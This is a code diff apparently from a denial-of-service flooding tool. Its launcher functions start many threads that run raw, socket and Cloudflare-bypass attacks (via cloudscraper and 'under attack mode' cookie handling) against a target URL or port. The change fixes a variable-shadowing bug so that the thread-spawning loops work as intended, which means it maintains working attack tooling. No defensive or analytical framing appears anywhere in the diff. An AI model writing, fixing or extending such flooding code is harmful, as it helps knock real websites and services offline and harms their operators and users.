@@ -24,8 +24,8 @@ def LaunchRAW(url, th, t):
     threads_count = 0
     while threads_count <= int(th):
         try:
-            th = threading.Thread(target=AttackRAW, args=(url, until))
-            th.start()
+            thd = threading.Thread(target=AttackRAW, args=(url, until))
+            thd.start()
             threads_count += 1
         except:
             pass
@@ -52,8 +52,8 @@ def LaunchSOC(url, port, th, t):
     request_list.append(request)
     while threads_count <= int(th):
         try:
-            th = threading.Thread(target=AttackSOC, args=(url, port, until))
-            th.start()
+            thd = threading.Thread(target=AttackSOC, args=(url, port, until))
+            thd.start()
             threads_count += 1
         except:
             pass
@@ -80,8 +80,8 @@ def LaunchCFB(url, th, t):
     scraper = cloudscraper.create_scraper()
     while threads_count <= int(th):
         try:
-            th = threading.Thread(target=AttackCFB, args=(url, until, scraper))
-            th.start()
+            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
+            thd.start()
             threads_count += 1
         except:
             pass
@@ -131,8 +131,8 @@ def LaunchUAM(url, th, t):
         scraper.cookies = jar
     while threads_count <= int(th):
         try:
-            th = threading.Thread(target=AttackUAM, args=(url, until, scraper))
-            th.start()
+            thd = threading.Thread(target=AttackUAM, args=(url, until, scraper))
+            thd.start()
             threads_count += 1
         except:
             pass
@@ -194,8 +194,8 @@ def LaunchCFPRO(url, th, t):
 
     while threads_count <= int(th):
         try:
-            th = threading.Thread(target=AttackCFPRO, args=(url, until, scraper))
-            th.start()
+            thd = threading.Thread(target=AttackCFPRO, args=(url, until, scraper))
+            thd.start()
             threads_count += 1
         except:
             pass
@@ -276,8 +276,8 @@ def LaunchCFSOC(url, th, t):
 
 	while threads_count <= int(th):
 		try:
-			th = threading.Thread(target=AttackCFSOC,args=(until, target, network,))
-			th.start()
+			thd = threading.Thread(target=AttackCFSOC,args=(until, target, network,))
+			thd.start()
 			threads_count += 1
 		except:  
 			pass
